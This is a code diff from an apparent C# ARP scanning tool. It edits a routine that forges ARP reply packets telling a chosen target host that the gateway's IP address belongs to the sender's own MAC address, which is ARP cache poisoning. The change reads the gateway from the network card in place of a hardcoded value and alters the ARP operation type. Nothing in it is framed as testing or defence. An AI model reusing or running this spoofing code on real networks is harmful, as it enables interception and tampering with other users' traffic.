@@ -99,7 +99,6 @@ namespace ARPSCanning
                 return "fail";
             }
             ARP arp = new ARP(device);
-            // arp.Timeout = new TimeSpan(delay);
             device.Open(DeviceMode.Promiscuous, 200);
             var re_mac = arp.Resolve(t_ip);
             if (re_mac == null)
@@ -186,13 +185,13 @@ namespace ARPSCanning
             IPAddress src_ip = null;        // Gateway ip
             PhysicalAddress dst_mac = null; // 타깃 mac
             PhysicalAddress src_mac = null; // 나의 mac
-
+            var card = NetworkInterface.GetAllNetworkInterfaces()[1].GetIPProperties().GatewayAddresses;
             dst_ip = IPAddress.Parse(tbox_ip.Text);
             dst_mac = PhysicalAddress.Parse(tbox_mac.Text.Replace(':', '-'));
-            src_ip = IPAddress.Parse("192.168.0.1");
+            src_ip = card.First().Address;
             src_mac = NetworkInterface.GetAllNetworkInterfaces()[1].GetPhysicalAddress();
             EthernetPacket epacket = new EthernetPacket(device.MacAddress, dst_mac, EthernetPacketType.Arp);
-            ARPPacket arp = new ARPPacket(ARPOperation.Response, dst_mac, dst_ip,device.MacAddress, src_ip);
+            ARPPacket arp = new ARPPacket(ARPOperation.DRARPReply, dst_mac, dst_ip,device.MacAddress, src_ip);
             epacket.PayloadPacket = arp;
             device.SendPacket(epacket);
             device.Close();
